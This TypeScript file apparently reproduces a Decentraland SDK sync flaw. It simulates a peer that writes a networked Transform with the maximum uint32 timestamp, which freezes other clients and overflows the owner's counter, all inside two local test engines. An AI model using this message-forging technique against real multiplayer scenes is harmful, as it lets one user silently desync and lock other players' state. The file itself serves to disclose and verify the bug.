import { Engine, Entity, TextShape, Transform, engine } from '@dcl/sdk/ecs'
// The per-engine component factories are not re-exported from the package root.
import { Transform as TransformComponent, NetworkEntity, SyncComponents } from '@dcl/ecs/dist/components'
import { componentNumberFromName } from '@dcl/ecs/dist/components/component-number'
import { Color4, Vector3 } from '@dcl/sdk/math'
import type { Transport } from '@dcl/ecs/dist/systems/crdt/types'
import { ReadWriteByteBuffer } from '@dcl/ecs/dist/serialization/ByteBuffer'
import { readMessage } from '@dcl/ecs/dist/serialization/crdt/message'
import { PutNetworkComponentOperation } from '@dcl/ecs/dist/serialization/crdt/network/putComponentNetwork'
import { CrdtMessageType } from '@dcl/ecs/dist/serialization/crdt/types'

// An attacker writes a synced component with the maximum timestamp. Two things
// follow, and they land on different clients:
//   #7 every OTHER client freezes at the attacker's value, because no later
//      write can out-rank the maximum timestamp.
//   #8 any client that received it — the owner included — has its own counter
//      pinned at the maximum, so its next increment overflows uint32 back to 0
//      and everything it sends afterwards carries the lowest possible timestamp.
// The owner's OWN screen looks fine (a local write always wins locally), which
// is what makes this invisible to the person being frozen.
const MAX_U32 = 4294967295
const OWNER = '0xME'
const ATTACKER = '0xATTACKER'
const ownerNetworkId = componentNumberFromName(OWNER)
const attackerNetworkId = componentNumberFromName(ATTACKER)

const FRAMES_PER_STEP = 25

type Sender = { address: string; networkId: number }
type Phase = 'idle' | 'attacked' | 'fought-back' | 'done'

let sign: Entity
let frames = 0
let phase: Phase = 'idle'
let rendered = ''
let fightbackStarted = false

let ownerValue = NaN
let observerValue = NaN
let ownerOutgoing: number[] = []

// Two private engines: the owner of the entity, and another peer observing it.
// The owner's outgoing messages are relayed into the observer, so what the rest
// of the room sees is measured, not assumed.
const owner = Engine()
const observer = Engine()
const OwnerTransform = TransformComponent(owner)
const OwnerNetworkEntity = NetworkEntity(owner)
const OwnerSyncComponents = SyncComponents(owner)
const ObserverTransform = TransformComponent(observer)
const ObserverNetworkEntity = NetworkEntity(observer)

let ownerEntity: Entity
let observerEntity: Entity | undefined

const ownerNet: Transport = {
  type: 'network',
  filter: () => true,
  send: async (message) => {
    for (const chunk of Array.isArray(message) ? message : [message]) {
      if (!chunk?.byteLength) continue
      // Relay the owner's traffic to the observer, exactly as comms would.
      ;(observerNet.onmessage as (m: Uint8Array, se?: Sender) => void)(chunk, {
        address: OWNER,
        networkId: ownerNetworkId
      })
      const buffer = new ReadWriteByteBuffer(chunk)
      let parsed
      while ((parsed = readMessage(buffer))) {
        if (
          (parsed.type === CrdtMessageType.PUT_COMPONENT || parsed.type === CrdtMessageType.PUT_COMPONENT_NETWORK) &&
          parsed.entityId === (ownerEntity as number)
        ) {
          ownerOutgoing.push(parsed.timestamp)
        }
      }
    }
  }
}
const observerNet: Transport = { type: 'network', filter: () => true, send: async () => {} }
owner.addTransport(ownerNet)
observer.addTransport(observerNet)

// The owner relays into the observer during its own update, so the owner must
// finish updating before the observer processes what arrived — sequentially,
// never concurrently.
async function tickBoth() {
  await owner.update(1 / 30)
  await observer.update(1 / 30)
}

function transformBytes(x: number): Uint8Array {
  const data = new ReadWriteByteBuffer()
  OwnerTransform.schema.serialize(
    {
      position: Vector3.create(x, 1, 8),
      rotation: { x: 0, y: 0, z: 0, w: 1 },
      scale: Vector3.One(),
      parent: 0 as Entity
    },
    data
  )
  return data.toBinary()
}

/** The attacker's maximum-timestamp write, delivered to both real peers. */
function attackerWritesMax() {
  const sender: Sender = { address: ATTACKER, networkId: attackerNetworkId }
  const send = (t: Transport) => {
    const message = new ReadWriteByteBuffer()
    PutNetworkComponentOperation.write(
      ownerEntity,
      MAX_U32,
      OwnerTransform.componentId,
      ownerNetworkId,
      transformBytes(999),
      message
    )
    ;(t.onmessage as (m: Uint8Array, s?: Sender) => void)(message.toBinary(), sender)
  }
  send(ownerNet)
  send(observerNet)
}

function render() {
  const lines = ['a peer writing a synced component with the maximum timestamp', '']

  let verdict = ''
  if (phase === 'done') {
    lines.push(`the owner’s entity started at x=1; the attacker wrote x=999 at timestamp ${MAX_U32}`)
    lines.push(`the owner then drove its own Transform to x=42, four times`)
    lines.push('')
    lines.push(`owner’s own screen shows:            x=${ownerValue}`)
    lines.push(`every other client shows:            x=${observerValue}`)
    lines.push(`timestamps the owner put on the wire: ${ownerOutgoing.join(', ') || 'none'}`)
    lines.push('')

    const frozen = observerValue === 999
    const overflowed = ownerOutgoing.some((t) => t === 0)
    if (frozen && overflowed) {
      verdict =
        `ISSUE PRESENT: every other client is frozen at 999 while the owner sees 42, and ` +
        `the owner’s timestamp overflowed to 0, so nothing it sends can ever win again.`
    } else if (frozen) {
      verdict = `ISSUE PRESENT (freeze): every other client is pinned at 999.`
    } else {
      verdict = `NO FREEZE: the observer tracked the owner (x=${observerValue}).`
    }
    lines.push(verdict)
  } else {
    lines.push('running the attack...')
  }

  const text = lines.join('\n')
  if (text === rendered) return
  rendered = text
  TextShape.createOrReplace(sign, {
    text,
    fontSize: 1,
    textColor: verdict === '' ? Color4.White() : verdict.startsWith('ISSUE') ? Color4.Red() : Color4.Green(),
    width: 20,
    height: 10
  })
  console.log(text)
}

function driver() {
  frames++
  switch (phase) {
    case 'idle':
      if (frames >= FRAMES_PER_STEP) {
        attackerWritesMax()
        void tickBoth().then(() => {
          ownerOutgoing = []
          phase = 'attacked'
        })
      }
      break
    case 'attacked':
      if (frames >= FRAMES_PER_STEP * 2 && !fightbackStarted) {
        fightbackStarted = true
        let step = 0
        const drive = () => {
          OwnerTransform.createOrReplace(ownerEntity, {
            position: Vector3.create(42, 1, 8),
            rotation: { x: 0, y: 0, z: 0, w: 1 },
            scale: Vector3.One(),
            parent: 0 as Entity
          })
          void tickBoth().then(() => {
            if (++step < 4) drive()
            else {
              ownerValue = OwnerTransform.get(ownerEntity).position.x
              observerValue = observerEntity !== undefined ? ObserverTransform.get(observerEntity).position.x : NaN
              phase = 'done'
            }
          })
        }
        drive()
        phase = 'fought-back'
      }
      break
  }
  render()
}

export function main() {
  sign = engine.addEntity()
  Transform.create(sign, { position: Vector3.create(8, 2, 8) })

  // The owner creates and syncs its entity; the observer receives it.
  ownerEntity = owner.addEntity()
  OwnerTransform.create(ownerEntity, {
    position: Vector3.create(1, 1, 8),
    rotation: { x: 0, y: 0, z: 0, w: 1 },
    scale: Vector3.One(),
    parent: 0 as Entity
  })
  OwnerNetworkEntity.create(ownerEntity, { networkId: ownerNetworkId, entityId: ownerEntity })
  OwnerSyncComponents.create(ownerEntity, { componentIds: [OwnerTransform.componentId] })

  void tickBoth().then(() => {
    observerEntity = Array.from(observer.getEntitiesWith(ObserverNetworkEntity))[0]?.[0]
  })

  engine.addSystem(driver, 0, 'repro/driver')
}
